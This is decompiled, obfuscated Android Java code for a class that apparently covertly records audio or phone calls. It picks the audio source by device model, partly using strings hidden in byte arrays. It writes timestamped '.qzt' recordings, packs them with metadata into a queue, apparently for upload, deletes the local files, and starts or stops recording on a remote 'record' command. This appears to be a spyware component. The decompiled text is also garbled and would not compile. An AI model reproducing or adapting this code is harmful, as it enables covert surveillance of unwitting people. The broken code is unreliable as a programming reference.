package o;

import android.media.MediaRecorder;
import android.os.Build;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.Date;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import org.json.JSONObject;

public class Scheduler
  extends ?
  implements ?<IF>
{
  private static final byte[] context = { 76, -24, -40, -45, -15, 69, -69, 61, -1, -2, -2, -15, 69, -62, 46, 4, 1, -2 };
  private static byte[] name = { 35, 33, 65, 77, 82, 10 };
  private int format = 0;
  private int[] index = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0 };
  private MediaRecorder mRecorder = null;
  private String res;
  private boolean state;
  
  public Scheduler() {}
  
  private boolean execute(String paramString1, boolean paramBoolean, Date paramDate1, Date paramDate2, String paramString2)
  {
    Connection localConnection1 = new Connection(paramDate1);
    Connection localConnection2 = new Connection(paramDate2);
    if (paramBoolean)
    {
      Util.read();
      paramDate1 = Logger.get(Util.getString(), false);
      paramDate2 = Logger.get(paramString1, false);
      paramString1 = paramDate1;
      paramDate1 = paramDate2;
    }
    else
    {
      Util.read();
      paramDate1 = Logger.get(Util.getString(), false);
      paramString1 = Logger.get(paramString1, false);
    }
    int i = paramDate1.length + 44 + paramString1.length;
    paramDate2 = new byte[i];
    System localSystem = new System(paramDate2, 0, i);
    this$0.putInt(2008121901);
    this$0.putInt(1);
    this$0.putInt(325);
    this$0.putInt(8001);
    if (paramBoolean) {
      i = 1;
    } else {
      i = 0;
    }
    this$0.putInt(i);
    long l = type;
    this$0.putLong(l);
    l = type;
    this$0.putLong(l);
    i = paramDate1.length;
    this$0.putInt(i);
    i = paramString1.length;
    this$0.putInt(i);
    this$0.put(paramDate1);
    this$0.put(paramString1);
    paramString2 = new File(paramString2);
    if ((file.exists()) && (file.length() > 6L) && (file.canRead()))
    {
      i = 0;
      if (Method.equals(paramString2.read(0, 6), name, name.length)) {
        i = name.length;
      }
      paramDate1 = paramString2.next(i);
      paramString1 = paramDate1;
      i = 0;
      while (i < paramDate1.length) {
        i += index[(paramDate1[i] >> 3 & 0xF)] + 1;
      }
      if (i != paramDate1.length)
      {
        paramString1 = new byte[i];
        java.lang.System.arraycopy(paramDate1, 0, paramString1, 0, i);
      }
      paramString1 = new Field(320, paramDate2, paramString1);
      paramDate1 = getthis$0;
    }
    try
    {
      paramDate1.put(paramString1);
      paramString1 = new byte[4];
      System04this$0.putInt(-1);
      paramString1 = new Field(320, paramDate2, paramString1);
      paramDate1 = getthis$0;
    }
    catch (Exception paramString1)
    {
      try
      {
        paramDate1.put(paramString1);
        file.delete();
        return true;
        return false;
        paramString1 = paramString1;
      }
      catch (Exception paramString1)
      {
        for (;;) {}
      }
    }
  }
  
  private int start(LogEntry paramLogEntry)
  {
    if (!date) {
      return 0;
    }
    boolean bool2 = text;
    if (state) {
      localObject1 = Build.MODEL;
    }
    try
    {
      localObject1 = ((String)localObject1).toLowerCase();
      boolean bool1 = false;
      boolean bool3 = ((String)localObject1).contains("i9100");
      if (bool3)
      {
        bool1 = true;
        format = 2;
      }
      else
      {
        bool3 = ((String)localObject1).contains("galaxy nexus");
        if (bool3)
        {
          bool1 = true;
          format = 0;
        }
        else
        {
          i = context[16] - 1;
          bool3 = ((String)localObject1).contains(start(i, i, i));
          if (bool3)
          {
            bool1 = true;
            format = 2;
          }
          else
          {
            bool3 = ((String)localObject1).contains("xt910");
            if (bool3)
            {
              bool1 = false;
            }
            else
            {
              i = context[16];
              j = context[16];
              bool3 = ((String)localObject1).contains(start(i - 1, j, j - 1));
              if (bool3)
              {
                bool1 = true;
                format = 2;
              }
            }
          }
        }
      }
      state = bool1;
      if (bool1) {
        if (!type)
        {
          if (mRecorder == null)
          {
            i = 0;
          }
          else
          {
            localObject1 = mRecorder;
            ((MediaRecorder)localObject1).stop();
            localObject1 = mRecorder;
            ((MediaRecorder)localObject1).release();
            mRecorder = null;
            i = 1;
          }
          if (i != 0)
          {
            JSONArray.get();
            localObject1 = JSONArray.newScheduledPool();
            localObject2 = new Ticker(this, paramLogEntry, bool2);
            localObject3 = TimeUnit.MILLISECONDS;
            ((ScheduledExecutorService)localObject1).schedule((Runnable)localObject2, 100L, (TimeUnit)localObject3);
            localObject1 = Channel.create();
            if (localObject1 != null) {
              ((Channel)localObject1).connect();
            }
          }
        }
        else
        {
          localObject1 = new Long(java.lang.System.currentTimeMillis()).toString();
          localObject2 = new StringBuilder();
          localObject3 = Logger.name;
          localObject1 = (String)localObject3 + "/" + (String)localObject1 + ".qzt";
          localObject2 = Channel.create();
          if (localObject2 != null) {
            ((Channel)localObject2).open();
          }
          i = format;
          bool1 = startRecording(i, (String)localObject1);
          if (bool1 != true) {
            state = false;
          }
          localObject1 = Channel.create();
          if (localObject1 != null) {
            ((Channel)localObject1).connect();
          }
        }
      }
    }
    catch (Exception paramLogEntry)
    {
      try
      {
        int j;
        long l = ((Date)localObject3).getTime();
        int k = (int)(l / 1000L);
        Object localObject3 = new byte[4];
        Object localObject4 = new System((byte[])localObject3, 0, 4);
        localObject4 = this$0;
        ((ByteBuffer)localObject4).putInt(k);
        paramLogEntry.write((byte[])localObject3);
        localObject3 = new byte[4];
        localObject4 = new System((byte[])localObject3, 0, 4);
        localObject4 = this$0;
        ((ByteBuffer)localObject4).putInt(0);
        paramLogEntry.write((byte[])localObject3);
        localObject3 = new byte[4];
        localObject4 = new System((byte[])localObject3, 0, 4);
        localObject4 = this$0;
        ((ByteBuffer)localObject4).putInt(j);
        paramLogEntry.write((byte[])localObject3);
        paramLogEntry.write(Logger.get((String)localObject1, true));
        paramLogEntry.write(Logger.get((String)localObject1, true));
        paramLogEntry.write(Logger.get((String)localObject2, true));
        paramLogEntry.write(Logger.get((String)localObject2, true));
        localObject1 = new byte[4];
        Object localObject2 = new System((byte[])localObject1, 0, 4);
        localObject2 = this$0;
        ((ByteBuffer)localObject2).putInt(i);
        paramLogEntry.write((byte[])localObject1);
        int i = Type.TAG;
        localObject1 = new byte[4];
        localObject2 = new System((byte[])localObject1, 0, 4);
        localObject2 = this$0;
        ((ByteBuffer)localObject2).putInt(i);
        paramLogEntry.write((byte[])localObject1);
        paramLogEntry = new Field(561, null, paramLogEntry.toByteArray());
        localObject1 = getthis$0;
      }
      catch (IOException paramLogEntry)
      {
        try
        {
          ((LinkedBlockingQueue)localObject1).put(paramLogEntry);
          for (;;)
          {
            return 0;
            localException = localException;
            break;
            paramLogEntry = paramLogEntry;
          }
        }
        catch (Exception paramLogEntry)
        {
          for (;;) {}
        }
      }
    }
    if ((!state) && (!type))
    {
      if (text)
      {
        localObject1 = name;
      }
      else
      {
        Util.read();
        localObject1 = Util.getString();
      }
      if (!text)
      {
        localObject2 = name;
      }
      else
      {
        Util.read();
        localObject2 = Util.getString();
      }
      localObject3 = start;
      if (time == null) {
        i = 0;
      } else {
        i = (int)((time.getTime() - start.getTime()) / 1000L);
      }
      paramLogEntry = new ByteArrayOutputStream();
      if (bool2) {
        j = 1;
      } else {
        j = 0;
      }
    }
  }
  
  private static String start(int paramInt1, int paramInt2, int paramInt3)
  {
    byte[] arrayOfByte1 = context;
    int i = 11 - paramInt2 * 7;
    paramInt3 = 103 - paramInt3 * 4;
    int j = 0;
    int m = 0;
    paramInt1 = paramInt1 * 2 + 8;
    byte[] arrayOfByte2 = new byte[paramInt1];
    int k = paramInt1 - 1;
    paramInt2 = paramInt3;
    paramInt1 = i;
    if (arrayOfByte1 == null)
    {
      j = k;
      paramInt1 = m;
      paramInt2 = paramInt3;
    }
    for (;;)
    {
      paramInt2 = paramInt2 - j - 2;
      paramInt3 = i + 1;
      j = paramInt1;
      paramInt1 = paramInt3;
      arrayOfByte2[j] = ((byte)paramInt2);
      if (j == k) {
        return new String(arrayOfByte2, 0);
      }
      paramInt3 = j + 1;
      j = arrayOfByte1[paramInt1];
      i = paramInt1;
      paramInt1 = paramInt3;
    }
  }
  
  private boolean startRecording(int paramInt, String paramString)
  {
    mRecorder = new MediaRecorder();
    mRecorder.setAudioSource(paramInt);
    mRecorder.setOutputFormat(3);
    mRecorder.setAudioEncoder(1);
    mRecorder.setOutputFile(paramString);
    MediaRecorder localMediaRecorder = mRecorder;
    try
    {
      localMediaRecorder.prepare();
      localMediaRecorder = mRecorder;
      localMediaRecorder.start();
    }
    catch (Exception paramString)
    {
      for (;;) {}
    }
    mRecorder = null;
    return false;
    res = paramString;
    return true;
  }
  
  public final void doInBackground()
  {
    ProfileFragment.newInstance().add(this);
  }
  
  public final void execute()
  {
    ProfileFragment.newInstance().update(this);
  }
  
  public final boolean execute(Integer paramInteger)
  {
    if (this$0.has("record")) {}
    try
    {
      boolean bool = paramInteger.toString("record");
      state = bool;
    }
    catch (JSONException paramInteger)
    {
      for (;;) {}
    }
    state = false;
    return true;
  }
  
  public final void read() {}
}
